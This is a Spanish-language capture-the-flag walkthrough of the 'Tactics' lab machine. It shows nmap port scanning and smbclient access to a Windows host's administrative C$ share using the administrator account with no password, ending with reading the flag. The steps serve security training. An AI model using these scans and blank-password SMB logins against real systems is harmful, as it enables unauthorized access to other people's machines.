# Tactics

🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.189.148

PING 10.129.189.148 (10.129.189.148) 56(84) bytes of data.
64 bytes from 10.129.189.148: icmp_seq=1 ttl=127 time=163 ms

--- 10.129.189.148 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 163.328/163.328/163.328/0.000 ms
```

> Sistema operativo:  **Windows**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv 10.129.189.148 -oG openPorts

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 135,139,445 -sCV 10.129.189.148 -oN targeted

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2024-03-12T21:44:34
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

| Puerto | Servicio     | Versión                       |
| ------ | ------------ | ----------------------------- |
| 135    | msrpc        | Microsoft Windows RPC         |
| 139    | netbios-ssn  | Microsoft Windows netbios-ssn |
| 445    | microsoft-ds | ?                             |

🗹 Listar los recursos compartidos mediante el servicio SMB con el usuario `administrator` y sin proporcionar contraseña:

```shell
smbclient -L //10.129.189.148 -U administrator
Password for [WORKGROUP\administrator]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

🗹 Acceder al servicio SMB:

```shell
smbclient //10.129.189.148/C$ -U administrator
Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
cd Users\Administrator\Desktop
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Apr 22 04:16:03 2021
  ..                                 DR        0  Thu Apr 22 04:16:03 2021
  desktop.ini                       AHS      282  Wed Apr 21 12:23:32 2021
  flag.txt                            A       32  Fri Apr 23 06:39:00 2021

		3774463 blocks of size 4096. 1156617 blocks available
smb: \Users\Administrator\Desktop\> more flag.txt
```
## Flag

La flag se encuentra en el directorio `C:\Users\Administrator\Desktop`.
